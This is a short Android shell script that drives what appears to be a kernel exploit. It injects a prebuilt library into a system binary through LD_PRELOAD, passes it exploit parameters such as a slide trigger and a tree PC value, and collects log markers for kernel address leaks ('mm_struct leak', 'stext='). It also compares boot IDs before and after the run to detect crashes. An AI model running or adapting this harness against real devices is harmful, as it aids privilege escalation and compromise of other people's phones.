#!/system/bin/sh
SRC=/sdcard/Documents/matisse_backup_essentials/preload_mt19_slidetrigger.so
DST=/data/local/tmp/preload.so
RUNLOG=/data/local/tmp/mt19_s4.out
LOG=/sdcard/Documents/matisse_backup_essentials/logs/mt19_shift4.txt
rm -f $DST; cp $SRC $DST; sync
echo "boot_before=$(cat /proc/sys/kernel/random/boot_id)" > $LOG
am kill-all 2>&1 | tail -1
rm -f $RUNLOG
timeout 140 env \
  PSELECT_SLIDE_TRIGGER=1 \
  PSELECT_TREE_PC=ffffffb0fffffff8 \
  PSELECT_TREE_LEFT=0 \
  PSELECT_SHIFT=4 \
  PSELECT_SKIP_WARMUP=1 \
  LD_PRELOAD=$DST /system/bin/sleep 100 > $RUNLOG 2>&1
echo "run_rc=$?" >> $LOG
grep -a 'found 3\|collision finding failed\|mm_struct leak failed\|leak retry\|SLIDE page prepared\|mt19b: sched\|slide pselect returned\|bad leaked\|stext=' $RUNLOG | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
echo "boot_after=$(cat /proc/sys/kernel/random/boot_id)" >> $LOG
echo "=== DONE ===" >> $LOG
